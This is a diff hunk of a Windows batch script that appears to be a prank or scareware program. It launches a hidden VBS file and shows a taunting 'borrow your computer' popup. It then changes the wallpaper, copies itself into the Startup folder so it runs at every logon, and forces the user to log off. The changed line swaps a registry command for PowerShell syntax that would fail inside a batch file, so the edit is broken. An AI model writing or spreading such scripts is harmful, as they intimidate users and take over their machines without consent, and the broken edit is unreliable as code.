@@ -188,7 +188,7 @@ start /min %temp%\creepy2.vbs
 timeout 3 >nul
 powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Can i borrow your computer for a sec', ' ', [System.Windows.Forms.ToolTipIcon]::None)}"
 timeout 4 >nul
-reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%appdata%\willishot\wallpaper.bmp" /f >nul
+Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -value "%appdata%\willishot\wallpaper.bmp" >nul
 xcopy %appdata%\willishot\batstart.bat "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" >nul
 ping localhost -n 1 >nul
 shutdown /l >nul
